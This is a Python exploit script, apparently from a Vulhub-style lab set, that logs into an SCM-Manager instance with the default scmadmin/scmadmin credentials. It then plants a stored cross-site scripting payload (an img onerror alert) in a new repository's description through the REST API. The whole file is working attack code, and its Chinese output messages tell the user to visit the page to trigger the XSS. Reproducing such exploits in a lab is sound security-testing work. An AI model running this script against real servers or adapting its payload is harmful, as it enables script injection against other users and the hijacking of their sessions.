from loguru import logger
import json
import re
import requests
import traceback
import random
from collections import OrderedDict

url = "http://172.16.31.147:8080/"
username = "scmadmin"
password = "scmadmin"

sess = requests.Session()
login_url = url + "scm/api/rest/authentication/login.json"
headers = {
		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
		"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
	}
paylaod = f"username={username}&password={password}"
try:
	rep = sess.post(login_url, headers=headers, data=paylaod, timeout=10)
	if sess.cookies.get("JSESSIONID"):
		cookie = sess.cookies.get("JSESSIONID")
		xss_url = url + "scm/api/rest/repositories.json"
		headers = {
				"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
				"Content-Type": "application/json",
				"X-Requested-With": "XMLHttpRequest",
				"Cookie": f"JSESSIONID={cookie}"
			}
		name = "VulhubExpand-"+str(random.random())
		xss_payload = f'''{{
	"name":"{name}",
	"type":"git",
	"contact":"admin@admin.com",
	"description":"<img src=x onerror=alert(\\"{name}\\")>",
	"public":true
}}'''
		rep = sess.post(xss_url, headers=headers, data=xss_payload, timeout=10)
		if rep.status_code == 201:
			print(f"访问{url}scm/即可触发XSS。登录用户名密码为：scmadmin/scmadmin")
		else:
			print("插入XSS失败")
	else:
		print("登录失败，可能是用户名密码错误。")
except Exception as err:
	print(err) 
